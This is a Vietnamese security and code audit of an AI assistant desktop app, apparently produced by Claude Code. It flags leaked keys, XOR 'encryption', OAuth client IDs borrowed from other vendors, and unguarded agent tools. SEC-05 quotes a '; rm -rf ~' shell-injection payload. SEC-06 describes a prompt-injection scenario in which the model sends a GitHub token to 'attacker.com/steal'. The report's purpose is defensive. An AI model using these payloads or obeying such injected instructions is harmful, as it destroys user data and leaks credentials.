# V-Assistant — Báo cáo Audit Toàn diện

> **Ngày audit:** 2026-07-14
> **Phạm vi:** toàn bộ repo tại commit `7e8c32d` + thay đổi chưa commit trên nhánh `claude/v-assistant-desktop-abs2gw`
> **Người thực hiện:** Claude Code (audit theo yêu cầu PO)
> **Lượt trước:** các phát hiện của lượt quét 1 đã được xác nhận lại và bổ sung ở lượt 2 (đánh dấu 🆕)

---

## 0. Tóm tắt điều hành

| Hạng mục | Đánh giá |
|---|---|
| Hướng đi sản phẩm | ✅ Rõ ràng, có căn cứ — nhưng đang đi 2 đường song song (2 engine) |
| Chất lượng code | 🟢 Trên trung bình: comment tốt, module nhỏ, có smoke test |
| Bảo mật | 🔴 4 vấn đề nghiêm trọng cần xử lý trước khi commit/ship |
| Tài liệu | 🟡 Rất đầy đủ nhưng có mâu thuẫn nội bộ (CHECKLIST ↔ code ↔ README) |
| Sẵn sàng production | 🔴 Chưa — thiếu đóng gói runner, token refresh, rào native tools |

**3 việc phải làm ngay hôm nay (trước bất kỳ commit nào):**
1. Thêm `.vua_vault_dev.json` + `.vua_state_dev.json` vào `.gitignore`, **revoke 2 key OpenRouter** trong đó.
2. Gỡ Google `client_secret` khỏi `src/runtime/oauth.ts:90` (chưa bị commit — còn kịp).
3. Quyết định lại luồng OAuth: ngừng dùng client ID mượn của Codex CLI / Claude Code / Gemini CLI.

---

## 1. Hướng đi & Kiến trúc

### 1.1 Điểm mạnh
- Tầm nhìn sản phẩm nhất quán: "AI cho người phổ thông, cài 2 phút" — mọi quyết định UI (ẩn embedding, ẩn NanoClaw, 1-click) đều bám nguyên tắc này.
- Kiến trúc SQLite IPC kế thừa NanoClaw có căn cứ kỹ thuật rõ (journal mode DELETE vì VirtioFS, seq chẵn/lẻ chống collision — đều có comment giải thích).
- Agent Runner độc lập SDK là hướng đúng: không phụ thuộc Claude Agent SDK, chạy đa provider.

### 1.2 Vấn đề lớn nhất: 2 engine song song đang cùng được nuôi
Hiện có **hai bộ provider adapter + tool-loop + streaming hoàn chỉnh**:

| | Engine webview (`src/runtime/`) | Agent Runner (`agent-runner/`) |
|---|---|---|
| Providers | `providers.ts` (~360 dòng) | `providers/adapters/*` (~700 dòng) |
| Tool loop | trong `streamOpenAICompat` | `poll-loop.ts` |
| Tools | vault_list, http_request, connector_call | bash, file_*, grep, glob, http_request, vault_list |
| Trạng thái | đang được thêm tính năng (RAG, Telegram, scheduler) | đã pass e2e nhưng UI chưa dùng làm đường chính |

Hệ quả:
- **Telegram long-polling & scheduler chạy trong webview** → chỉ hoạt động khi app đang mở. Sai với lời hứa "agent tự chạy theo lịch".
- **Năng lực tool phụ thuộc cách đăng nhập**: đường OpenAI-compat có tools, đường Anthropic/Gemini native (`streamAnthropic`, `streamGemini`) **không có tools** → hành vi app khác nhau khó hiểu với user.
- Mọi tính năng mới phải viết 2 lần hoặc lệch nhau.

**Khuyến nghị:** chốt Agent Runner làm engine duy nhất; webview chỉ giữ demo engine. Dồn sức làm phần glue còn thiếu (CHECKLIST §6.2–6.3: session manager, delivery, router) thay vì mở rộng engine webview.

---

## 2. Phát hiện Bảo mật

### 🔴 SEC-01 — API key thật nằm ngoài `.gitignore` (Critical)
- **File:** `.vua_vault_dev.json` (chứa 2 key OpenRouter `sk-or-v1-…` thật), `.vua_state_dev.json` (chứa lịch sử chat).
- **Hiện trạng:** untracked nhưng KHÔNG có trong `.gitignore` — một lần `git add .` là lộ key lên remote.
- **Khắc phục:** thêm cả 2 pattern vào `.gitignore`; **revoke 2 key** (đã đi qua nhiều phiên làm việc); cân nhắc `git filter-repo` nếu lỡ commit sau này.

### 🔴 SEC-02 — Google `client_secret` hardcode trong source (Critical)
- **File:** `src/runtime/oauth.ts:90` (`GOCSPX-…`).
- **Hiện trạng:** chưa bị commit (chỉ ở working tree) — xác minh bằng `git show HEAD`.
- **Khắc phục:** gỡ khỏi source trước khi commit. Client secret không bao giờ được nhúng vào app desktop (binary decode được).

### 🔴 SEC-03 — Mượn OAuth client của app khác (Critical — ToS + chức năng)
- **File:** `src/runtime/oauth.ts` — `OAUTH_CONFIGS`:
  - `app_EMoamEEZ73f0CkXaXp7hrann` = client của **OpenAI Codex CLI**
  - `9d1c250a-e61b-44d9-88ed-5944d1962f5e` = client của **Claude Code**
  - Client Google `1071006060591-…` = của **Gemini CLI**
- **Rủi ro:** (a) vi phạm điều khoản vendor → có thể khóa tài khoản người dùng; (b) **về mặt kỹ thuật không chạy được**: token OAuth Claude cần header beta riêng nhưng `providers.ts:302` gửi qua `x-api-key`; token ChatGPT là `id_token` định danh, không gọi được chat completions. Thực tế `.vua_vault_dev.json` cho thấy cả 3 provider đều đang chạy bằng **cùng một key OpenRouter** — luồng OpenRouter PKCE mới là thứ thật sự hoạt động.
- **Khắc phục:** giữ OpenRouter PKCE làm đăng nhập 1-click chính thức (hợp lệ, không cần đăng ký client); vendor trực tiếp = dán API key (như README đã mô tả); gỡ 3 client mượn.

### 🔴 SEC-04 — Vault "mã hóa" bằng XOR + key hardcode (High)
- **File:** `src-tauri/src/vault.rs:68-79` và bản sao thứ hai bằng TypeScript tại `agent-runner/src/vault/vault-resolver.ts:15` (cùng key `v-assistant-secure-vault-salt-key-360org` nằm ở **2 ngôn ngữ, 2 file**).
- **Bản chất:** XOR với key cố định là obfuscation, không phải mã hóa — ai đọc binary/source là giải được toàn bộ `vault.db`. Vault được định vị là "tính năng chính" của sản phẩm nên đây là khoảng cách lớn giữa lời hứa và thực tế.
- **README còn nói vault dùng macOS Keychain** — tài liệu và code mâu thuẫn.
- **Khắc phục:** AES-256-GCM với key ngẫu nhiên per-device cất trong OS keychain (crate `keyring`); data vẫn ở SQLite. Runner lấy key qua IPC/env do Tauri cấp lúc spawn, không hardcode.

### 🟠 SEC-05 🆕 — Shell injection / lỗi quoting trong tool `grep` và `glob` của runner (High)
- **File:** `agent-runner/src/native-tools/index.ts:188` — `execSync(\`grep ${grepArgs.join(' ')}\`)`: `pattern` và `path` nối chuỗi thẳng vào shell, không escape. Tương tự `glob` (dòng 224): `find ${cwd} -path '${pattern}'`.
- **Rủi ro:** model (hoặc nội dung độc trong tài liệu/tin nhắn Telegram được đưa vào prompt) chèn `; rm -rf ~` qua pattern. Runner vốn có tool `bash` nên model "được phép" chạy lệnh — nhưng injection này còn là **lỗi đúng đắn**: pattern chứa khoảng trắng/ký tự đặc biệt sẽ hỏng.
- **Khắc phục:** dùng `execFileSync('grep', grepArgs)` (mảng args, không qua shell); glob thì dùng `fs.globSync` (Node 22+) hoặc package `fast-glob` đã phổ biến.

### 🟠 SEC-06 🆕 — `connector_call` / `http_request` cho phép exfiltrate credential tới domain bất kỳ (High)
- **File:** `src/runtime/connectors.ts` (`absolute()` chấp nhận mọi full URL rồi vẫn gắn `Authorization: Bearer <token>`), `src/runtime/tools.ts` + `agent-runner/src/native-tools/index.ts` (placeholder `{{vault:X.password}}` resolve vào request tới **mọi** URL).
- **Kịch bản:** prompt injection từ tài liệu Knowledge / tin Telegram → model gọi `connector_call(connector:"github", target:"https://attacker.com/steal")` → token GitHub bay sang attacker.
- **Khắc phục:** bind credential với host — connector chỉ gắn auth khi URL thuộc base domain của nó; vault placeholder chỉ resolve khi request đến host khớp field `url`/`service` của entry; log + confirm khi vượt allowlist.

### 🟠 SEC-07 — Native tools không có rào (High — chặn ship)
- **File:** `agent-runner/src/native-tools/index.ts`.
- `bash`/`file_write`/`file_edit` chạy trên host: không giới hạn thư mục, không command gate, không giới hạn tài nguyên. CHECKLIST §13 đã ghi nhận chưa làm — cần coi là **điều kiện chặn release** vì đối tượng là người dùng phổ thông.
- **Khắc phục tối thiểu:** allowlist thư mục làm việc per-agent (như NanoClaw group folder), command gate (`NanoClaw/src/command-gate.ts` có sẵn để kế thừa), giới hạn timeout/output đã có một phần.

### 🟡 SEC-08 — Vault plaintext ra đĩa ở dev mode (Medium, dev-only)
- **File:** `vite.config.ts` middleware ghi `.vua_vault_dev.json` plaintext; `src/runtime/vault.ts` web fallback dùng `localStorage`.
- Chấp nhận được cho dev, nhưng phải đi kèm SEC-01 (gitignore) và không được để cơ chế này lọt vào build production.

### 🟡 SEC-09 — OAuth loopback không kiểm tra `state` (Low)
- **File:** `src-tauri/src/auth.rs`.
- PKCE đã chặn được kịch bản đánh cắp code; thiếu `state` chỉ còn rủi ro nhiễu/DoS cục bộ (process khác trên máy bắn code giả vào listener). Nên thêm `state` cho đúng chuẩn RFC 8252 khi tiện tay.

---

## 3. Chất lượng Code

### 3.1 Điểm cộng
- Comment giải thích **why** nhất quán ở hầu hết module (`engine.ts`, `auth.rs`, `poll-loop.ts` đều đọc là hiểu ý đồ).
- File nhỏ, phân tách rõ; `auth.rs` viết sạch, tách `handle_connection` unit-testable.
- 10+ smoke test scripts chạy trong `npm run check` + e2e cho runner — thực dụng, không cần framework.
- Poll loop xử lý crash-recovery (`clearStaleProcessingAcks`), heartbeat, session continuation đầy đủ.

### 3.2 Điểm trừ cụ thể

| # | Vị trí | Vấn đề | Hướng sửa |
|---|---|---|---|
| Q-01 | `src/lib/store.tsx:307` | Đọc state bằng `setState(cur => { s = cur; return cur; })` giữa async flow — anti-pattern, dựa vào tối ưu nội bộ không cam kết của React 18, `s` có thể `undefined` → crash `s!` | Dùng `stateRef` đã có sẵn ở dòng 399 |
| Q-02 | `src/lib/store.tsx` (938 dòng) | God file: state + Telegram bridge + scheduler + OAuth completion + knowledge | Tách dần theo domain khi đụng vào; chưa cần refactor gấp |
| Q-03 🆕 | `agent-runner/src/native-tools/index.ts` | `execSync` chặn event loop → trong khi `bash`/`grep` chạy, poll loop và heartbeat **đứng hình** → host có thể tưởng runner chết và restart | Chuyển sang `spawn` async (NanoClaw gốc dùng async) |
| Q-04 | `src/runtime/providers.ts` | Tool loop chỉ có ở đường OpenAI-compat; `streamAnthropic`/`streamGemini` không hỗ trợ tools | Tự khỏi khi chốt engine runner (mục 1.2) |
| Q-05 | `vite.config.ts` | Middleware dev phình thành mini-backend 120 dòng, các "safety check" chống ghi đè state là băng dán cho race condition đồng bộ 2 chiều | Chấp nhận dev-only; đừng mở rộng thêm |
| Q-06 🆕 | `agent-runner/src/poll-loop.ts:334` | Sau tool round, `currentPrompt = ''` — một số provider từ chối message user rỗng; lịch sử hội thoại rebuild mỗi iteration thay vì tích lũy chuẩn | Kiểm tra với cả 3 adapter; thêm test case tool-loop 2+ vòng |
| Q-07 | `src/runtime/oauth.ts` | URL builder cho 4 provider lặp 2 lần (desktop + web, ~60 dòng trùng) | Gộp thành 1 hàm `buildAuthorizeUrl(provider, callback)` |
| Q-08 🆕 | `src-tauri/src/runtime.rs:49-91` | `find_executable` dò PATH + homebrew + NVM của máy dev; spawn bằng `npx tsx` từ thư mục project | Chỉ chạy trên máy dev — xem GAP-02 |

---

## 4. Điểm thừa (nên cắt/gộp)

1. **Hai bộ provider stack** (~600 dòng trùng lặp về vai trò) — xem mục 1.2. Đây là điểm thừa lớn nhất và đắt nhất để duy trì.
2. **Ba đường chat trong `createEngine()`**: demo → nanoclaw → provider engine. Khi runner thành đường chính, provider engine webview nên bị xóa, không giữ "phòng hờ".
3. **`ROUTED_MODELS` + câu chuyện "nối thẳng vendor"**: README nói ChatGPT/Claude/Gemini là dán key nối thẳng vendor, `oauth.ts` lại làm OAuth mượn client, còn thực tế chạy qua OpenRouter — 3 phiên bản của cùng một tính năng. Chốt 1.
4. **Logic URL OAuth lặp 2 lần** (Q-07).
5. **XOR key nhân bản ở 2 ngôn ngữ** (SEC-04) — dù sửa hay không sửa crypto, key/logic chỉ được tồn tại 1 chỗ.

## 5. Điểm thiếu (gap so với lời hứa sản phẩm)

| # | Thiếu | Ảnh hưởng |
|---|---|---|
| GAP-01 | **Token refresh** — access token Google hết hạn sau ~1h, app lưu như key vĩnh viễn | Đăng nhập gãy sau 1 giờ, không có đường phục hồi ngoài đăng nhập lại |
| GAP-02 | **Đóng gói runner vào installer** — `runtime.rs` spawn `npx tsx` từ thư mục project | Bản build production trên máy user không có `agent-runner/src` lẫn `npx` → engine chính không chạy |
| GAP-03 | Host-side glue (session manager, delivery, router — CHECKLIST §6.2–6.3) | Chat UI chưa thực sự chạy qua runner; điều kiện tiên quyết cho mục 1.2 |
| GAP-04 | Rào bảo mật native tools (SEC-05/06/07) | Chặn ship |
| GAP-05 | Lịch chạy nền — scheduler/Telegram sống trong webview | Tính năng "tự chạy theo lịch" chỉ đúng khi app mở |
| GAP-06 | Master password / device-bound key cho Vault (CHECKLIST §7 còn [ ]) | Gắn với SEC-04 |
| GAP-07 | Code signing/notarize macOS + auto-update | Cần cho phân phối thật |

## 6. Tài liệu — mâu thuẫn cần đồng bộ

Tài liệu là điểm mạnh của project (9 docs, lịch sử đầy đủ) nên càng cần giữ đúng:

1. **CHECKLIST tự mâu thuẫn:** §5 ghi "Agent Runner: HOÀN THÀNH" với [x] hầu hết, nhưng bảng tổng kết cuối ghi *Agent Runner (Core): 0 xong / 42 chưa làm*. §5.7 đánh dấu MCP tools [x] trong khi §10.3 nói MCP client chưa tích hợp [ ]. §2.4/§10.2 lặp nhau về per-role skills với trạng thái khác nhau ([x] vs [ ]).
2. **README ↔ code:** README nói Vault dùng OS Keychain; `vault.rs` thực tế là SQLite + XOR. README nói vendor login là "dán key"; code đang thử OAuth mượn client.
3. `.vua_state_dev.json`/`.vua_vault_dev.json` chưa được nhắc trong DEVELOPMENT.md dù là một phần của luồng dev.

## 7. Lộ trình khuyến nghị

### P0 — Hôm nay, trước mọi commit
- [ ] SEC-01: gitignore 2 file dev + revoke 2 key OpenRouter
- [ ] SEC-02: gỡ `client_secret` khỏi `oauth.ts`
- [ ] SEC-03: gỡ 3 OAuth client mượn; chốt OpenRouter PKCE + dán key vendor

### P1 — Tuần này
- [ ] Q-01: sửa hack `setState` trong `store.tsx`
- [ ] SEC-05: `execFileSync`/glob thư viện cho grep+glob (kèm Q-03 chuyển async)
- [ ] Đồng bộ CHECKLIST/README khớp thực tế (mục 6)

### P2 — Sprint kế
- [ ] GAP-03: host-side session manager + delivery + router → chat UI chạy qua runner
- [ ] Đóng băng tính năng mới trên engine webview
- [ ] SEC-06: allowlist host cho connector/vault placeholder
- [ ] SEC-07: command gate + giới hạn thư mục cho native tools

### P3 — Trước release
- [ ] SEC-04 + GAP-06: Vault AES-GCM, key trong OS keychain, master password
- [ ] GAP-01: token refresh
- [ ] GAP-02: bundle runner (Bun binary/Node) vào Tauri resources
- [ ] GAP-07: signing, notarize, auto-update

---

*File này do audit tự động tạo; cập nhật trạng thái các mục khi xử lý xong và ghi nhận vào CHANGELOGS.md.*
